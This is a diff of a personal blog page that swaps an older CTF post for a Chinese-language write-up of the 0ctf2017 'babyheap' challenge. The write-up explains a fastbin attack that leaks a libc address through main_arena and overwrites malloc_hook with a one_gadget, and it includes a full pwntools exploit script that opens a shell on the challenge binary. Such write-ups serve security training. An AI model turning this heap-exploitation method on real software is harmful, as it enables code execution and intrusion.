@@ -15,17 +15,23 @@
 
 
 
-<meta name="description" content="陈师傅线代考了满分？希尔密码，动手算一下得到flag。 Fuze.vs.Zombieemmmmm一个小游戏，杀死1000只僵尸可以过关，掏出CE,找到了score对应的地址，一只僵尸10分，改成9990分之后再杀一只僵尸就跳出了flag。正常方法尝试中….">
+<meta name="description" content="fastbin attack，比cgctf的note稍微难一点。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="geekgame-2">
-<meta property="og:url" content="http://yoursite.com/2018/10/11/geekgame-2/index.html">
+<meta property="og:title" content="0ctf2017-babyheap">
+<meta property="og:url" content="http://yoursite.com/2019/03/27/0ctf2017-babyheap/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="陈师傅线代考了满分？希尔密码，动手算一下得到flag。 Fuze.vs.Zombieemmmmm一个小游戏，杀死1000只僵尸可以过关，掏出CE,找到了score对应的地址，一只僵尸10分，改成9990分之后再杀一只僵尸就跳出了flag。正常方法尝试中….">
+<meta property="og:description" content="fastbin attack，比cgctf的note稍微难一点。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-10-11T10:19:52.530Z">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcly1g1ht6an0thj30ug0bqgo4.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1g1huobqblqj311207o0wv.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1g1htpxbbwdj30us0di40w.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1g1humj3kmrj30xm07mjvk.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1g1hutuwtkmj30li0cuq4n.jpg">
+<meta property="og:updated_time" content="2019-03-27T17:14:59.886Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="geekgame-2">
-<meta name="twitter:description" content="陈师傅线代考了满分？希尔密码，动手算一下得到flag。 Fuze.vs.Zombieemmmmm一个小游戏，杀死1000只僵尸可以过关，掏出CE,找到了score对应的地址，一只僵尸10分，改成9990分之后再杀一只僵尸就跳出了flag。正常方法尝试中….">
+<meta name="twitter:title" content="0ctf2017-babyheap">
+<meta name="twitter:description" content="fastbin attack，比cgctf的note稍微难一点。">
+<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tKfTcly1g1ht6an0thj30ug0bqgo4.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +63,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>geekgame-2 | 4eriri&#39;s blog</title>
+<title>0ctf2017-babyheap | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -199,11 +205,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-geekgame-2" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-0ctf2017-babyheap" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/10/11/geekgame-2/" class="article-date">
-      <time datetime="2018-10-11T09:44:59.000Z" itemprop="datePublished">2018-10-11</time>
+      <a href="/2019/03/27/0ctf2017-babyheap/" class="article-date">
+      <time datetime="2019-03-27T14:43:07.000Z" itemprop="datePublished">2019-03-27</time>
 </a>
 
 
@@ -218,7 +224,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      geekgame-2
+      0ctf2017-babyheap
     </h1>
   
 
@@ -235,8 +241,25 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="陈师傅线代考了满分？"><a href="#陈师傅线代考了满分？" class="headerlink" title="陈师傅线代考了满分？"></a>陈师傅线代考了满分？</h1><p>希尔密码，动手算一下得到flag。</p>
-<h1 id="Fuze-vs-Zombie"><a href="#Fuze-vs-Zombie" class="headerlink" title="Fuze.vs.Zombie"></a>Fuze.vs.Zombie</h1><p>emmmmm一个小游戏，杀死1000只僵尸可以过关，掏出CE,找到了score对应的地址，一只僵尸10分，改成9990分之后再杀一只僵尸就跳出了flag。正常方法尝试中….</p>
+        <p>fastbin attack，比cgctf的note稍微难一点。</p>
+<a id="more"></a>
+<p>保护全开，思路和cgctf的note是一样的，当时做的时候因为找不到wp，就是对着这道题的wp做的。</p>
+<p>当只有一个 <code>small/large chunk</code> 被释放时，<code>small/large chunk</code>的 <code>fd</code> 和 <code>bk</code> 指向 <code>main_arena</code> 中的地址。如果能泄漏出这里<code>fd</code>或<code>bk</code>指向的地址，那么就可以得到libc基址。最后利用<code>malloc_hook</code>，可以执行onegadget，获取shell。</p>
+<p>这道题比cgctf的note难的一点就是，这道题不存在UAF，所以泄漏<code>main_arena</code>的地址变得稍微难了一点，但是利用<code>fastbinattack</code>还是可以做到的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10) #用来allocate(0x10) #实现allocate(0x10) #fastbin attackallocate(0x10) #用来修改下一个chunk的sizeallocate(0x80) #用来泄漏main_arenaallocate(0x80) #使上一个chunk free后能指向main_arenafree(1)free(2)fill(0,0x41,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+&quot;\x80&quot;)fill(3,0x20,p64(0)*3+p64(0x21))allocate(0x10)allocate(0x10)fill(3,0x20,p64(0)*3+p64(0x91))free(4)dump(2)leak=sh.recv(8)libc_base=u64(leak)-0x3c4b20-88</span><br><span class="line">malloc_hook=libc_base+0x3c4b20-10</span><br></pre></td></tr></table></figure>
+<p>这里通过修改第5个chunk的size，2次malloc第五个chunk，index2和index4指向的都是第五个chunk，free4之后dump2就能打印出<code>main_arena+88</code>地址，从而泄漏libc基址。</p>
+<p>关于<code>main_arena</code>在libc中的偏移，可以使用ida打开libc文件，在<code>malloc_trim</code>函数中找到。</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1ht6an0thj30ug0bqgo4.jpg" alt=""></p>
+<p>在调用malloc函数时，程序会对<code>malloc_hook</code>进行检查，如果不为0，就会调用<code>malloc_hook</code>指向的函数，借此调用onegadget。fastbin是一个单链表，其fd指针会指向下一个可分配的chunk。修改掉最后并进fastbin中的chunk的fd指针，使其指向<code>malloc_hook</code>，这样之后第二次malloc出的chunk就会出现在<code>malloc_hook</code>。但是在malloc之前，程序会对要分配的地址进行检查，如果没有对应size的chunk，就不会在此处分配，所以要进行偏移构造。</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1huobqblqj311207o0wv.jpg" alt=""></p>
+<p>可以看到偏移-20-0x3的时候<code>malloc_hook</code>上方就构造出了一个size为0x7f的chunk。</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g1htpxbbwdj30us0di40w.jpg" alt=""></p>
+<p>找到的<code>onegadget</code>，尝试发现<code>0x4526a</code>的可以用。</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1humj3kmrj30xm07mjvk.jpg" alt=""></p>
+<p>经过尝试，填充大小为19时可以覆盖到<code>malloc_hook</code></p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*- # from pwn import *def allocate(Size):	sh.recvuntil(&quot;Command: &quot;)	sh.sendline(&quot;1&quot;)	sh.recvuntil(&quot;Size: &quot;)	sh.sendline(str(int(Size)))def fill(Index,Size,Content):	sh.recvuntil(&quot;Command: &quot;)	sh.sendline(&quot;2&quot;)	sh.recvuntil(&quot;Index: &quot;)	sh.sendline(str(Index))		sh.recvuntil(&quot;Size: &quot;)	sh.sendline(str(int(Size)))	sh.recvuntil(&quot;Content: &quot;)	sh.send(Content)def free(Index):	sh.recvuntil(&quot;Command: &quot;)	sh.sendline(&quot;3&quot;)	sh.recvuntil(&quot;Index: &quot;)	sh.sendline(str(Index))def dump(Index):	sh.recvuntil(&quot;Command: &quot;)	sh.sendline(&quot;4&quot;)	sh.recvuntil(&quot;Index: &quot;)	sh.sendline(str(Index))		elf = ELF(&apos;./libc.so.6&apos;)sh = process(&apos;./heap-2&apos;)allocate(0x10)allocate(0x10)allocate(0x10)allocate(0x10)allocate(0x80)allocate(0x80)free(1)free(2)fill(0,0x41,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+&quot;\x80&quot;)fill(3,0x20,p64(0)*3+p64(0x21))allocate(0x10)allocate(0x10)fill(3,0x20,p64(0)*3+p64(0x91))free(4)dump(2)leak=sh.recvuntil(&quot;\x00\x00&quot;)[-8:]libc_base=u64(leak)-0x3c4b78malloc_hook=libc_base+0x3c4b20-0x10print hex(malloc_hook)allocate(0x60)free(4)fill(2,8,p64(malloc_hook-0x20-0x3))allocate(0x60)allocate(0x60)fill(6,0x1b,p64(0)*2+&quot;\x00\x00\x00&quot;+p64(libc_base+0x4526a))allocate(0x1)sh.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g1hutuwtkmj30li0cuq4n.jpg" alt=""></p>
 
       
     </div>
@@ -245,13 +268,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/10/11/geekgame-2/">geekgame-2</a></p>
+        <p><span>本文标题:</span><a href="/2019/03/27/0ctf2017-babyheap/">0ctf2017-babyheap</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-10-11, 17:44:59</p>
-        <p><span>最后更新:</span>2018-10-11, 18:19:52</p>
+        <p><span>发布时间:</span>2019-03-27, 22:43:07</p>
+        <p><span>最后更新:</span>2019-03-28, 01:14:59</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/10/11/geekgame-2/" title="geekgame-2">http://yoursite.com/2018/10/11/geekgame-2/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/11/geekgame-2/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/27/0ctf2017-babyheap/" title="0ctf2017-babyheap">http://yoursite.com/2019/03/27/0ctf2017-babyheap/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/03/27/0ctf2017-babyheap/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -263,16 +286,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/10/11/sus-unpackme/">
-                    sus-unpackme
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/10/10/geekgame-1/">
-                    geekgame-1
+                <a href="/2019/03/26/栈-SROP/">
+                    栈-SROP
                 </a>
             </div>
         
@@ -284,7 +301,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#陈师傅线代考了满分？"><span class="toc-number">1.</span> <span class="toc-text">陈师傅线代考了满分？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fuze-vs-Zombie"><span class="toc-number">2.</span> <span class="toc-text">Fuze.vs.Zombie</span></a></li></ol>
+            
         
     </div>
     <style>
@@ -320,7 +337,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"geekgame-2　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"0ctf2017-babyheap　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -340,15 +357,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/10/11/sus-unpackme/" title="上一篇: sus-unpackme">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/10/10/geekgame-1/" title="下一篇: geekgame-1">
+            <a href="/2019/03/26/栈-SROP/" title="下一篇: 栈-SROP">
                 <i class="fa fa-angle-right"></i>
             </a>
         
